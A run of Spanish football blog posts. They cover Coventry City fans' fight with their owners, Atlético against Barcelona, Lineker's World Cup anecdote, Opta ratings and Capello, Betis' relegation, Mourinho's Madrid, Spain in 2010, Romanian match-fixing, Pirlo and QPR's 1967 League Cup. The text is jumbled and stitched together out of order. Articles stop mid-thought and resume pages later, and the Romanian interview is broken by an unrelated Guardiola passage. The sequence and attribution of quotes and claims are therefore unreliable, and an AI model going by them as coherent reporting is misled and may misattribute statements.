orgulo como el mundo del fútbol se ha solidarizado con su pelea, como su reivindicación ha encontrado apoyo incluso en los canales de televisión nacionales. Danny Kelly de BT Sports (uno de los dos canales que dan la Premier League en Inglaterra) les escogió recientemente como la mejor afición del año. Pero el apoyo popular no se está traduciendo en soluciones principalmente porque ningún órgano de gobierno ha movido un dedo. Orton señala directamente a la Football League como cómplices en el desaguisado. “Se ha demostrado el poco carácter de la Football League que ha dejado hacer a Sisu lo que ha querido” La liga, quizá temiendo que el el Coventry pudiera haberse retirado de la competición debido a la falta de estadio, no ha hecho demasiado para proteger su gente. Por defender a los aficionados de un club que ha trabajado decisivamente por el desarrollo del fútbol en Inglaterra. De uno con 34 temporadas consecutivas en Primera. No deja de ser irónico que el lema del campeonato sea “Real Football, Real fans”…Sin embargo, contra todo pronóstico, los jugadores están rindiendo a un nivel aceptable pese al clima que les rodea “El equipo lo está haciendo sorprendentemente bien dada la crisis institucional y todo este desastre”, explica el coordinador de KCIC. Y tanto. El Coventry marcha décimo a seis puntos de los puestos que dan derecho a jugar la promoción de ascenso a segunda. No está mal para una plantilla debilitada en la que el 80% de los jugadores tienen menos de 25 años. En el lado opuesto y remando a la inversa están los dueños actuales, que acumulan yaun descenso de categoría (en 2012 bajaron al tercer escalón por primera vez en 42 años) y cuyo proyecto inmediato es seguir hostigando a un ayuntamiento para que les ceda un emplazamiento público usando un club centenario como rehén.En un momento de la charla intenté regatear la miseria del fútbol moderno y le pregunté a Michael Orton por los buenos tiempos. Por los años en la Premier, por la Copa que le ganaron al Tottenham de Hoddle, por Cyrille Regis y aquella camiseta Talbot, pero la actualidad le oscurece tanto la perspectiva que prefiere pasar por alto las fotografías bonitas para centrarse en su pelea.Primero porque no interpretó bien el modo, y permitió que sus hombres de banda sucumbieran a la irresistible y facilona tentación de colgar balones al área, a la espera de un remate aéreo que, dadas las circunstancias físicas de sus hipotéticos rematadores, era ciertamente improbable que llegara. ¿Quién le hizo ver a Dani Alves que la solución para atacar al Atleti consistía en enviar melones al encuentro de un nueve que no existe de manera insistente? Y segundo, porque el mejor jugador del equipo, ese otro que en tantas otras ocasiones había salvado el cuello al equipo con una aparición estelar, jamás hizo acto de presencia en el partido. Enjaulado por el sistema defensivo y de vigilancia que Simeone dispuso sobre él, Leo Messi firmó el partido más anodino e intrascendente que uno personalmente le recuerda. Jamás llegó a estar cómodo sobre el césped, y nunca ofreció la sensación de poder aparecer al rescate comme d’habitude. No cabe duda alguna sobre el argentino. Volverá y lo hará a lo grande, repitiendo ese típico sobrevolar sobre el césped descabalgando defensores a su paso, pero ahora mismo no está, y atarlo en corto no es una tarea excesivamente complicada.La noche atlética terminó en apoteosis. En explosión de júbilo colectiva por haber tomado consciencia de que lo que su loca y arriesgada aventura le deparaba era algo bueno e inolvidable. El Atleti revivirá una semifinal de Copa de Europa cuarenta años después y en un fútbol que ya, aparentemente, parecía no tener sitio para actores como él. No vamos a descubrir ahora, cuando ya ha pasado todo, que era algo que se veía venir desde tiempo atrás. Era tan sencillo como tirar de calculadora y hacer números. Allá por el mes de enero, cuando aún quedaban veinte partidos por disputarse, pocos, muy pocos creían en las posibilidades de salvación del Real Betis. La vida era feliz y apacible bajo el manto de Pepe Mel.“Ha habido muchos cambios positivos desde los años 70 y 80 cuando el hooliganismo y otros problemas estaban acabando con el fútbol. Pero la forma en cualquier tipo sin principios puede comprar un club inglés y hacer lo que le de la gana está creando nuevas crisis” Lleva razón, sabe que ganar esta lucha puede ser la llave para que el Coventry no muera y que el fútbol le pueda volver a dar alguna alegría.Fotos: KCIC Gary Lineker, ese titán inmaculado que supo flotar sobre la legión de mostrencos que pobló el fútbol británico en los ochenta y primeros noventa, cumplió ayer cincuenta años y la BBC decidió hacerle una entrevista para conmemorar tan señalada fecha en la vida de una de las leyendas del deporte inglés. ¿Saben que les digo? Maldita sea la hora en que se les ocurrió. Imaginen como le sienta a uno, que siempre ha admirado a Lineker tanto por su impresionante habilidad para depositar la pelotita en la malla como por su proverbial fair play (nunca fue amonestado en toda su carerra), lo de descubrir que el caballero por excelencia no era tan aseado como yo pensaba…Si no me creen vean el vídeo adjunto, lean a continuación la confesión del astro y díganme ahora si van a seguir mirando con los mismo ojos al otrora hombre limpio del fútbol europeo. “No me encontraba muy bien al descanso. Traté de hacerle una entrada a alguien, me estiré, me relajé y umm…Tuve suerte de que había llovido y pude hacer algo al respecto pero fue embarazoso. Fue durante el Mundial de 1990 contra Irlanda. Me puedes ver frotándome contra el suelo como un perro tratando de limpiarme. Fue la experiencia más horrible de mi vida.Nota: el autor ha omitido cualquier referencia al lenguaje intestinal en aras de preservar lo que queda del mito. Decía Gianni Rivera que el principal problema de la selección italiana es que vivía bajo el influjo de cincuenta millones de consejeros. Y no le faltaba razón. Si es cierto aquello de que un entrenador no puede sentirse como tal hasta que le despiden de su primer trabajo, un seleccionador no “vendría al mundo” hasta que cantase su primera convocatoria. El que se supone seleccionador nacional ha asistido en virtud de su cargo a partidos buenos, pasables y directamente anestesiantes; se ha metido paladas de vídeos entre pecho y espalda, incluso ha tenido unas palabritas con tal o cual díscolo a fin de recuperarlo para la causa. Es más, ha escrito sus veintidós en su libreta nueva y se camina hacia esa mesa atiborrada de micrófonos sintiéndose seleccionador nacional. Mira al tendido. Ellos son la prensa y yo el seleccionador nacional. Entonces lee el listado y ahí, cuando ese puzzle de méritos y aspiraciones no encaja para algunos, cuando el ingenio mediático crepita y brama a punto de embestirle, justo en ese preciso instante, es cuando nace el seleccionador.Pienso que se critican demasiado las decisiones de este gremio peculiar. Sobre todo teniendo en cuenta dos factores: que en ese sillón al rojo suelen sentarse técnicos con un perfil más cercano al del hombre experimentado que al del advenedizo y que el porcentaje de futbolistas talentosos de un país no tiende al infinito. En ocasiones contra toda razón el hincha exige que el suyo, cuyo golpeo de zurda está lógicamente a años luz de la del vecino elegido, se enfunde la camiseta nacional. Los periódicos deportivos, que adolecen cada vez más del espíritu analítico necesario, con cualquier cosita se arriman a ese sol llamado polémica que parece calentar de lo lindo y quien más quien menos haría su lista mejor que el entrenador de turno. Tal y como señalaba Gianni Rivera. Por eso, por arrojar luz sobre esta tendencia, me alegra leer que los chicos de Opta (una de las empresas líderes en el análisis de datos en el deporte) han elaborado una lista con los 22 jugadores que más rinden de la Premier League. Quizá alguno esperaría los contrario pero ¿Saben con cuantos de esos viene contando el archicuestionado Fabio Capello en sus convocatorias? Con 16. Alguien está haciendo los deberes.Capello nunca estará suficientemente agradecido por esta armadura de cifras que le han fabricado los estadísticos. Pero ¿Cómo lo hacen? Opta construye su estudio pasando al microscopio datos de todos los jugadores de la Premier League que hayan disputado más de 500 minutos, 239 futbolistas que cuentan para sus equipos. A estos se les valora otorgándoles notas positivas o negativas (sobre 100) en más de 300 facetas del juego. Puntúan hacia arriba si chutan, cabecean, roban o pasan la pelota correctamente y hacia abajo si pierden demasiados balones o tienen por costumbre surtir de balones al señor que vende pipas en el quinto anfiteatro. No sé si los datos que escupe está trituradora pueden tomarse como la verdad absoluta (no incluyen condicionantes personales de cada futbolista ni el grado de compenetración entre compañeros, por ejemplo) pero está cerca de serlo.Ese equipo nacional de rendidores, jugando al tradicional 4-4-2 inglés, estaría formado por Ben Foster (77 puntos) en la portería; Luke Young (54), John Terry (72), Rio Ferdinand (59) y Ashley Cole (68) atrás; Marc Albrighton (72), Steven Gerrard (75), Kevin Nolan (66) y James Milner (64) en el centro del campo y Andy Carroll (74) con Danny Welbeck (64) en punta. En el banquillo esperarían su turno Joe Hart (76), Micah Richards (53), Phil Jagielka (58), Gary Cahill (58), Leighton Baines (66), Joey Barton (63), Paul Scholes (65), Scott Parker (65), Stewart Downing (62), Darren Bent (64) y Luke Varney (57). Si exceptuamos que esa leyenda que atiende por el nombre de Paul Scholes y Luke Young decidieron retirarse en su día de las competiciones internacionales y que a Allbrington, Nolan, Wellbeck y Varney aun no saben lo que es notar la caricia de los tres leones en su pecho, tenemos a 16 de los 22 futbolistas más en forma del campeonato inglés en la agenda de Fabio Capello. En la conflictiva agenda de Capello. Independientemente de lo que los elegidos sean capaces de hacer después en los terrenos de juego, a tenor de los últimos resultados del equipo más bien poco, pero miro la retahíla estadística y piensa que quizá el italiano esté haciendo las cosas como es debbido después de todo… Mientras Klaus Iohannis, nuevo presidente de Rumanía, se afana en proyectar una imagen diferente de una nación carcomida por la corrupción y la crisis (son el segundo país más pobre de la Unión Europea) su fútbol deposita sobre la mesa el enésimo escándalo.Hasta que, un buen día, empujado por ciertas circunstancias previsibles, dejó de serlo.Lastrado por las importantísimas bajas sufridas a lo largo del pasado verano, el conjunto verdiblanco pronto comprobó que la ausencia de futbolistas como Cañas, Beñat o el meta Adrián San Miguel iba a suponer un menoscabo definitivo a los cimientos de su juego. Por si fuera poco, las nuevas incorporaciones, siempre de perfil bajo, no terminaban de acoplarse y funcionar. Se había tocado demasiado algo que, solo unos meses atrás, funcionaba muy bien. El beticismo no había conocido un Betis dirigido por Pepe Mel que no hubiera ido siempre a más en los tres años y medio que el técnico madrileño llevaba ocupando el banquillo de Heliópolis. Siempre mejorando, siempre creciendo… hasta que acabó siendo imposible.La destitución de Mel fue interpretada como un gravísimo error y una decisión injusta por parte de un importante sector de la afición bética, que para entonces ya había detectado que el problema no estaba en el banquillo, sino en las piezas distribuidas sobre el césped. El clima se enrareció aún más con la llegada de Juan Carlos Garrido, un técnico aparentemente empeñado en surcar la ola de la polémica en cuanto estaba se presentaba por el horizonte.No se había cruzado aún el umbral del parón navideño y las sensaciones transmitidas por el Betis eran las de un enfermo terminal cansado de luchar y entregado a la muerte. Llamativa fue la imagen del último encuentro de 2013. La derrota ante el Almería, por entonces un rival directo en la lucha por evitar el descenso, en el Villamarín dejaba al cuadro verdiblanco tocado y hundido. Aquella tarde hubo incluso lágrimas sobre el césped tras el pitido final. Quedaba por disputarse más de media Liga, pero las esperanzas eran ya mínimas.Garrido se fue del Betis tras apenas mes y medio en el cargo, dejando tras de sí una sensación de empozoñamiento y desidia imperdonable. La llegada de Gabriel Humberto Calderón, exjugador de la casa y personaje querido y respetado por la afición no buscó sino templar los ánimos y perseguir el imposible por la vía de la pacificación interna del club. Aplicó bien sus herramientas y sí es cierto que el clima se relajó considerablemente con su llegada al cargo, pero el paso de las jornadas evidenciaba que la salvación bética pasaba necesariamente por un auténtico milagro del cielo.Para el recuerdo de la temporada quedará la vibrante eliminatoria de Europa League frente al Sevilla, que solo pudo doblegar a su rival ciudadano en la tanda de penaltis, y la formidable entrega de una afición abnegada, que no dejó de derrochar orgullo y amor por sus colores sabiendo incluso que su triste destino estaba escrito.Lo mejor: La grada del Villamarín.Empieza el año y los equipos vuelven al escenario. Todos arrastran la tristeza postvacacional. Nunca los jugadores parecen más proletarios que en la vuelta al trabajo tras las fiestas. No sé si los clubes hacen balance de lo vivido y se ilusionan con el futuro. Algunos deberían hacerlo. Los que juegan a no descender deberían haber cenado lentejas el 31 de diciembre. No sé qué cenaría Florentino Pérez, pero algo debe andar mascando para darle una vuelta de tuerca a este engranaje mohoso llamado Real Madrid.La grandeza, como la amistad, es un sentimiento que debe cultivarse. Mimarse. Los que creemos que Mourinho es un buen entrenador no podemos obviar que su táctica mediática se basa en la crispación y el chuleo. Es su rollo, su way of life. Cada uno se defiende como puede. Porque hay que defenderse ante un tipo de periodismo sanguinolento que ve el fútbol como un elemento puramente tangencial. No se puede ser siempre tan punzante, ni tan inteligente. Paradójicamente, la brillantez a veces hay que aparcarla frente a la labor casi funcionarial del informador.Es mi opinión. También es mi opinión que Mourinho es un buen motivador que utiliza métodos chapuceros. Cómo decirlo. Que saca lo mejor de algunos jugadores pero el precio es ridiculizar a otros muchos. Como un entrenador de cadetes en un equipo de barrio. Con ese rasero peligroso. Debe ser difícil gobernar un vestuario de estrellas. Debe ser difícil hacer que corran los que no han corrido en su vida.No sé cuál es el problema del Madrid, pero está siendo una temporada pobre. Estéticamente es como uno de esos feístas cuadros de vanguardia: vemos algo horrible pero queremos creer que bajo esa apariencia despreciable late una voluntad rompedora de su creador. Que dentro del cuadro hay otro cuadro que sí trascenderá. O mejor dicho: que tanto abandono liguero es parte de un plan marvelístico para levantar la Champions. Dudo que las lesiones de Higuaín, el imposible recambio de Alonso, la vulgarización de Casillas, el insalvable juego de Kaká, la timidez de Modric o el burlesque de Coentrao sean cartas barajadas por Mourinho. Pero los aficionados somos personas de gustos sencillos y a veces creemos en este tipo de entrenador fatuo que, como las moscas, siempre parecen tramar algo.Creo que el Madrid tiene un problema. Un problema futuro. Si el Manchester United, o el que venga después hipotéticamente, apeara al equipo de Mourinho de la Liga de Campeones, el telón caería y veríamos a un club desnudo y obstinado, como al Mago de Oz manejando los mandos. Ocultando la realidad pedestre tras una cabeza con ínfulas, tras una imagen envalentonada de sí mismo. Mourinho sabe que la plantilla no rinde, que Di María no está rápido, que Özil sigue con su particular guadianismo, que con Benzema no es suficiente, que lo de Essien fue un capricho injustificable, que sin laterales no se pueden ganar partidos. Es decir, que la planificación de verano ha sido vaga. Queda Ronaldo, queda un buen Khedira, quedan Ramos y Pepe. Pero el Barcelona, con mucho menos, está batiendo records.No sé qué propósitos ha hecho Florentino. No sé si Mourinho ha reordenado los muebles de su casa buscando un Feng Shui óptimo. A veces un volantazo es la mejor manera de recuperar el camino perdido. Dos buenos fichajes, tal vez. Un delantero con hambre de mundo. Un lateral cumplidor, con la decencia suficiente de guardar la posición y hacer buena marca a balón parado. O quizás el portugués sólo deba relajarse. Dejar que el club extienda su magnificencia. Retomar las riendas de un caballo desbocado. Ir al trote, poco a poco, asegurar Europa. Reordenar las piezas. Confiar en Modric, darle a Casillas los galones que merece, decirle a Ramos que es el mejor central del mundo. Recuperar a Marcelo, esperar a Higuaín, arropar a Khedira todas las noches con un beso en la frente. Olvidarse de la liga. Jugar a los dardos, poner una foto de Old Trafford en el centro de una diana. Lo bueno de las derrotas es que permiten la práctica de ese maravilloso deporte al aire libre que es hacer leña del árbol caído. Cientos de jóvenes se acercan al tronco y lo astillan, lo desmenuzan, lo cortan con vigor, con entusiasmo, hasta que del árbol sólo queda el tocón muerto. Tras sus ventanas, cada uno con su hacha, esperando que finalmente el viento o la carcoma o un leñador muy avezado hagan su trabajo. La selección de Vicente del Bosque estuvo cerca de caer. El juego espeso frente a Suiza y su correspondiente derrota, el aséptico partido ante Honduras o la batalla turbia ante Chile, fueron muestras de que el tallo nudoso y recio que fuimos era ahora poco más que una vara mecida por el aire. Ni tanto, ni tan poco.Los nostálgicos entonan esa cansina plegaria de que cualquier tiempo pasado fue mejor. Luis Aragonés se obstina en seguir siendo el viejo gruñón y antipático que conocemos. La prensa se pone nerviosa, buscan culpables para saciar el hambre de los aficionados más intransigentes. Y empezamos a hacer listas de ausencias, como una familia triste en el día de navidad. Sin Senna, sin aquel juego de toque, sin Güiza, sin alternativas, sin Xavi en el mejor momento, sin portero y sin sangre en las venas. Una letanía que sólo trae fantasmas, inseguridades, y ese universal recurso para afrontar el futuro: el miedo.Con el partido de anoche todo vuelve a su lugar. Un espacio del que no deberíamos haber salido con tanta urgencia. La Selección Española no está jugando con plasticidad. No es aquel equipo –que a lo mejor no existió plenamente, que a lo mejor ha sido creado por la memoria borrosa- que practicaba un fútbol hermoso y letal. Ayer, viendo el partido ante Portugal, recordé el choque de cuartos ante Italia en la Eurocopa. Un equipo encerrado y otro equipo obligado a atacar, pero perezoso con el balón, mascando la jugada perfecta mientras pasaban los minutos. Era difícil atravesar con florituras una defensa poblada y con talento. La diferencia entre aquel equipo virtuoso de Luis Aragonés y este de Del Bosque es la alternativa al plan maestro. Aquella selección era homogénea, por eso costó ganar a un equipo que dejaba pocos espacios como Italia y resultó tan fácil la victoria ante un equipo valiente como el ruso. Su única vía de juego era el toque, danzar con el balón hasta encontrar el hueco milimétrico. Ponerla ahí, y celebrar el gol. Un estilo que se bautizó en Aarhus, con aquel gol de Ramos. Un planteamiento excitantemente nuevo en un país acostumbrado a la testosterona y a eso de La Furia.El plan de Aragonés funcionó y sorprendió. Guardiola aún no era entrenador del Barça, Mourinho acababa de llegar al Inter. Nos movíamos en otros terrenos. La campeona del mundo era Italia, dicho sea de paso. Pero el estilo, ese tiquitaca como fue bautizado, tiene un reverso tenebroso, como en un videojuego de lucha. El fútbol de toque necesita huecos, necesita puntos débiles. Sobra decir que ante un equipo con posesión de balón y rápido en la creación no puede uno salir a comerse el mundo. Se estila el freno de mano. Defensas pobladas, marcajes individuales y la posibilidad de ganar mediante el contraataque o a balón parado. Un fútbol rácano, sí, feo tal vez, pero efectivo desde que el mundo es mundo. Así esperó Suiza a España en el debut. Como un equipo acomplejado, suavón, que terminó llevándose el partido aprovechando el entumecimiento español. Honduras no dieron el nivel y, ante Chile, una selección sin miedo a sumarse al ataque, pudimos por fin encontrar la comodidad suficiente para jugar a eso que tanto nos gusta, a ese fútbol de salón, a ese fútbol de nuevos ricos con gustos caros. Refinado, eléctrico y decisivo.Ayer, contra Portugal, volvimos al problema de siempre. De qué sirve magrear la pelota si los delanteros están detrás del tapiz del contrario; si no hay espacio, si un delantero como Torres, que juega al desmarque y a los espacios, está ahogado entre tanto defensa. La irrupción de Llorente acabó con los peones. Ya nadie sabía a quien marcar, se cambió el status quo y el tablero saltó por los aires. Ese plan B, como lo llamamos, es indispensable cuando el manual de juego de España se puede descargar en pdf de cualquier lado. Ya no hay sorpresa, ni planteamientos osados por parte del contrario, ahora la favorita es España y la presencia de Llorente, de Navas o de Pedro, incluso la aportación de Cesc, sirven para colar el fútbol de La Roja, para quitarle los grumos, para darle una nueva fluidez, un nuevo giro, una ventana que da directamente a la victoria. En aquella noche austriaca España empató a cero y fue a los penaltis. Ayer vencimos por un gol a cero.Los argumentos de los nostálgicos me seducen poco. El juego de España es una evolución, no un paso atrás. Y es una evolución porque los rivales obligan al cambio. Ir a Sudáfrica jugando a lo mismo que hace dos años en Austria es vender el veneno y el antídoto en el mismo paquete. Pongo de nuevo el ejemplo de Italia. De nada les ha servido Lippi, de nada les sirvió esa añoranza de hace cuatro años tras una Eurocopa discreta. Creían que la mezcla de velocidad, casta y suerte les iba a llevar lejos y han hecho las maletas prematuramente. A eso me refiero cuando creemos ver en el pasado la solución a los problemas del futuro. Esta selección está haciéndolo bien. Los jugadores están dando mucho más de lo esperado. Busquets no desmerece a Senna, Llorente ha demostrado que puede cambiar un partido, Piqué está intratable… ninguno de ellos estaba en el 2008. Ante Paraguay, en cuartos de final, encontraremos la medida de esta selección. Caer será lo de siempre, pero si llegamos a semifinales podremos celebrar sin discreción que el conjunto está en buenas manos, que se han tomado decisiones importantes. Viendo los que van quedando por el camino hay que felicitarse por estar donde estamos desplegando un juego que no es de libro de arte de Taschen, pero que está muy por encima de más de la mitad de las selecciones que aún quedan en Sudáfrica. Creamos peligro, y a veces lo materializamos en gol. El fútbol se gana así, los grandes equipos no lo son solo por la vistosidad de su juego. Ayer, cuando llegué exultante a casa e intercambié impresiones con mis compañeros de DDF, me encabezoné en una idea: tengo la sensación de que España tiene que ganar sí o sí los partidos, que pase lo que pase, caerá un gol de nuestro lado. Eso no garantiza nada, tampoco mi entusiasmo infantil, las derrotas dolerán como siempre, pero acostarme ayer con esa sensación, con esa felicidad que surge del fútbol, es crédito suficiente para no avergonzarme de mi cándido optimismo. Cuando una puerta se cierra no se abre ninguna otra.ProSport, el segundo diario deportivo más leído del país, publicó el domingo una entrevista con un antiguo jugador del Dinamo de Bucarest en la que daba a entender que la eliminatoria contra la Lazio en la clasificación para la Champions League de 2007 había sido amañada.Un día más tarde, un accionista del Dinamo en aquellos años envió un mensaje al periódico para confirmar las palabras de Cristian Pulhac. “Tiene razón. El partido estaba amañado y el precio fue el traspaso de Stefan Radu a la Lazio. Cornel Dinu y Cristian Borcea (dos directivos, el segundo está en la cárcel por evadir impuestos procedentes de traspasos) negociaron el acuerdo con Lotito”. Contactado por el medio, Dinu negó haber participado en el pasteleo pero confesó que el encuentro había sido una farsa y añadió nuevos ángulos a la historia. Señala a Ioan Becali, agente influyente en el club, como responsable del amaño de un partido ante el Benfica en 1999 y como el artífice del traspaso de Radu al conjunto romano.Radu jugó aquella eliminatoria supuestamente adulterada; meses después el defensa vestía los colores de la Lazio. En Rumanía y en Italia se hizo oficial el traspaso por 4.5 millones de euros. Uno por la cesión de un año al club celeste y el resto por el pase completo pero Mircea Rednic, entrenador del Dinamo entonces, sostiene que Lotito pagó 7.2 millones por el futbolista. La Lazio ingresó unos 16 millones de euros solo por disputar aquella fase de grupos de la Liga de Campeones.Costin Stucan, el periodista de ProSport que ha destapado la historia, nos explica unas cuantas cosas sobre el funcionamiento del fútbol rumano que ayudan a comprender este y otros tantos desmanes recientes. ¿Por qué son tan comunes los amaños en el fútbol rumano?Bueno, esta es una pregunta muy difícil. durante los últimos treinta años el fútbol rumano ha desarrollado un sistema de corrupción contra el que es muy complicado luchar. Sin embargo, los amaños ya estaban ahí antes de los 70 y los 80. Hace poco encontré un artículo interesante en un periódico de la Rumanía estalinista, en los años 50, en el que el reportero cuenta la historia de un partido de primera división. El partido se jugaba en Resita, una pequeña ciudad de provincias, y la comidilla entonces era que el encuentro estaba amañado de antemano. Por supuesto, el reportero se mostraba en contra, pero el resultado estuvo de acuerdo con los rumores.En los ochenta, el amaño de partidos se convirtió en un arma política. El Steaua, club ligado al ejército y el Dinamo, el equipo de la policía secreta, eran las superpotencias del campeonato y rara vez perdían más de un partido o dos en la temporada. El Steaua llegó a disputar 104 partidos de liga sin conocer la derrota, una hazaña que ahora mismo se nos antoja difícil de imaginar como genuina. El Steaua amañaba partidos y el Dinamo también. En 1990, Cornel Dinu (el mismo que dice que el Dinamo-Lazio fue adulterado) declaró en ‘La Gazzetta dello Sport’ que Mircea Lucescu estaba al frente de la corrupción en el fútbol de Rumanía.Tengo entendido que en Rumanía existe incluso un término específico para definir el amaño de partidos. ¿Es cierto?Tras la caída de Ceausescu, el amaño de partidos se convirtió en un deporte en sí mismo. El sistema se dio en llamar ‘Cooperativa’, un término rumano muy popular en los años soviéticos derivado relacionado con la colectivización de la agricultura. Antes de que comenzara cada temporada, los presidentes y los dueños de los equipos de primera se reunían y decidían quien podía ganar el título, quién pelearía por ir a las competiciones europeas y quién por el descenso. El sistema era simple. Calculaban cada posible resultado y elaboraban una clasificación final. Los equipos que se suponía que debían luchar por sobrevivir se ayudaban recíprocamente. Ganaban en casa y perdían fuera. ¿Los clubes necesitan amañar partidos simplemente para sobrevivir?Desde finales de los 90, la Cooperativa está influenciada por el arreglo de partidos con los corredores de apuestas de por medio. La nueva tendencia en el fútbol rumano ofrecía la oportunidad del dinero fácil para jugadores y clubes. Con esta oportunidad entre manos, los inversores prefirieron mantener a los clubes en niveles de pura subsistencia para aumentar los beneficios. El rendimiento bajó rápidamente y las sospechas crecieron. El 80 % de los jugadores de primera división sufren impagos en mayor o menor medida. Muchos jugadores anónimos de categorías inferiores acaban confesando los amaños de los dirigentes solo para que les paguen el sueldo que les deben.El piso se queda unos minutos en silencio. El desorden en su desorden y el orden en su quietud incómoda. Sin luz, ni aire que agite la difunta paz de los objetos. No importa ya lo que pasó en ese piso. Quién habitó sus habitaciones. Qué luz arañó los cuerpos durante el desayuno, o los gritos o las risas, o el estruendo de la televisión, o las noticias inesperadas que quedaron ahorcadas del teléfono. Ni de donde vinieron ni a donde se fueron sus habitantes. Ni el llanto enfangado de un niño, ni el ruidoso silencio del sexo. El piso, tras la puerta cerrada, es un enjambre de muebles viejos. Cuando Guardiola cerró la puerta hoy, el piso volvió a ser sólo un desigual cubículo de cemento.Los que me habéis leído aquí sabéis que siempre critiqué a Guardiola, que siempre le cuestioné por esas cosas que en verdad no son tan importantes.¿La Federación o la Liga hacen algo para solucionar el problema?La situación está fuera de control. El presidente de la liga, Gino Iorgulescu fue presidente y dueño de club durante los años de la Cooperativa. El padre del presidente de la Federación, Răzvan Burleanu jugaba durante la plaga de amaños que infectó el campeonato durante los años ochenta. ¿Hay alguna esperanza de que vuelvan los buenos viejos tiempos?Los hinchas tienen pocas esperanzas. Los días de gloria se fueron hace mucho, pero de todos modos aquellos días fueron una creación artificial.Los actoresCornel Dinu. Fue central del Dinamo de 1966 a 1983 y de la selección rumana en el Mundial de 1970. Llegó a ser capitán del equipo nacional en los setenta y se sentó en el banquillo como entrenador durante un breve periodo de tiempo a principios de los noventa. Entrenó al Dinamo y ahora ocupa puesto administrativo en el club de Bucarest del que también ostenta un pequeño paquete accionarial. Bien relacionado con el fútbol italiano.Cristian Borcea. Empresario del sector del gas. Empezó como chofer de Dinu en el Dinamo y llegó a accionista de peso del club. En la década del 2000 aumenta su notoriedad en el club capitalino gracias a sus relaciones con los agentes Ioan y Victor Becali. Tanto Borcea como los heermanos Becali están actualmente en prisión por evesión de impuestos en, al menos, una docena de traspasos de futbolistas a ligas europeas.Cristian Pulhac. Lateral zurdo del Dinamo de 2002 a 2013. Ahora juega en la liga polaca.Ioan Becali. Hermano del ínclito Victor Becali. Agente y empresario del fútbol como él, fueron los primeros representantes autorizados en Rumanía tras la caída del comunismo. Está condenado a seis años de prisión por el mismo caso que Borcea y su hermano.Stefan Radu. Central del Dinamo de 2004 a 2008. Desde entonces juega en la Lazio, equipo con el que ha disputado 188 partidos oficiales. Internacional en 14 ocasiones.Claudio Lotito. Empresario italiano en el sector de la limpieza y la seguridad. Desde 2004 preside la Lazio, club del que es copropietario. También ostenta la copropiedad de la Salernitana. Para el club romano ha obtenido dos Copas y una Supercopa de Italia. Condenado inicialmente a 3 años de inhabilitación por su participación en el caso Calciopoli de apuestas ilegales en el fútbol italiano, ha ido evitando la sanción hasta su prescripción en 2014.La entereza con la que se afrontó el duro tramo final de la temporada. El acierto de Alfred N’diaye. Lo peor: El lamentable paso de Garrido por el club, con varios escándalos incluidos. El triste papel de algunas de las nuevas incorporaciones. La vista se nos va directamente sobre Joan Verdú. La lesión de Rubén Castro en el primer tramo liguero.Lo que espera: El futuro en Segunda debería pasar necesariamente por el ascenso en el primer año, siempre que se consiga superar la lógica inestabilidad que suele conllevar la pérdida de la categoría. Andrea Pirlo es una especie en peligro de extinción. Es un futbolista diferente y, sobre todo, es un futbolista extemporáneo. En los tiempos en los que la concepción del medio centro de troquel pasa por un perfil de jugador más musculado, más grande y atléticamente más desarrollado en detrimento, la mayoría de las veces, de una menor sutileza con el balón entre los pies, Pirlo aparece como un elemento impropio, casi como de otra época. Empeñado en honrar permanentemente esa máxima de ‘Penso, quindi gioco‘ (‘Pienso, luego juego‘) que dio título a su autobiografía. Su exclusividad lo hace aún más visible y determinante ante los ojos del aficionado. Ocurre, sin embargo, que el metrónomo bresciano va acumulando calendarios a sus espaldas. Su mente sigue clarividente como el primer día. Su aspecto físico de mirada lánguida y melena lacia, como de seductor protagonista de anuncio de vermut que ha hecho de su cuidada barba una especie de imagen de marca, incluso parece haber mejorado. Pero sus castigadas piernas ya no resisten los kilómetros como lo hacían antaño y Allegri se las debe ingeniar para dosificar su talento con raciocinio. Pirlo parece cansado de sentar cátedra en un fútbol que sí que valora sus enseñanzas pero que cada vez encuentra mejores excusas para prescindir de ellas. Como si extrañamente quisiera liberarse de su influencia. Como si una extraña querencia por el pasado, por retornar a las raíces de un fútbol que se hizo hombre entre los pies de futbolistas muy alejados del prototipo que representa el centrocampista juventino, contribuyera a acelerar su progresiva desaparición de la escena.Pirlo es un futbolista en peligro de extinción porque no van quedando muchos de los de su especie, si es que alguna vez hubo alguien semejante. Se empeña en seguir existiendo en un hábitat que a cada golpe recibido se vuelve un poco más hostil, como queriendo prolongar inútilmente una agonía cuyo final es por todos conocido. Tocando las últimas notas aún con perfección virtuosa. Y cuando ya no esté, cuando su cuerpo decida que ya es suficiente y pida tregua, admiraremos embobados sus imágenes con nostálgico deleite.Puedes comprar camisetas de Andrea Pirlo en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Corría la temporada 1966/67. Tras varios años deambulando sin pena ni gloria por la tercera categoría del fútbol inglés (por aquel entonces aún denominada Third Division), el Queens Park Rangers conseguía por fin alzarse con el título de la categoría de la mano de un futbolista tan genial como Rodney Marsh, logrando así el deseado ascenso y desatando una dinastía que llevaría al equipo del noroeste de Londres a escalar niveles hasta afianzarse entre los principales clubes del país. Pero el ascenso no iba a ser la única alegría de los Hoops en aquel recordado año.Aquella misma temporada, el equipo londinense se alzó con la League Cup que supone, hasta la fecha, el único título adornando las vitrinas de Loftus Road. Contra todo pronóstico por tratarse de un equipo de Third Division, los Rangers de Londres fueron eliminando a Colchester, Aldershot, Swansea, Leicester y Carlisle, favoreciéndose de unos sorteos bastante benévolos. En semifinales, ya a doble partido, el rival en suerte fue el Birmingham City, al que los londinenses pasaron por encima con un resultado global de 7-2 tras los dos partidos de la eliminatoria.El rival en la gran final, primera de la historia de la competición disputada en el estadio de Wembley, fue el West Bromwich Albion, equipo que por aquel entonces disputaba sus encuentros ligueros en la First Division, actual Premier League, por lo que la diferencia de nivel entre uno y otro equipo era considerable. El resultado en la final fue de 3-2 para el QPR (levantando un 0-2 al descanso) lo que le permitió alzarse con el primer y único título de sus 125 años de historia cuando aún militaba en la Third Division, siendo además el primer equipo militante en dicha categoría en alzarse con el trofeo. Años más tarde, ya en la década de los ochenta, el equipo de Shepherd’s Bush consiguió de nuevo meterse en sendas finales de la League Cup y de la FA Cup, cayendo derrotado en ambas ocasiones y dejando a la vieja y polvorienta copa del 67 como exclusiva inquilina de las vitrinas del club.Puedes comprar camisetas del Queens Park Rangers en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo.Bonus Track: Ojo al detallito de Rodney Marsh en su tercer gol de este hat-trick al Birmingham… Es curioso. Curioso y significativo. Si metes en Google Images el nombre de ‘Arrasate‘, el algoritmo del buscador te muestra imágenes de la localidad guipuzcoana de Arrasate (Mondragón, en 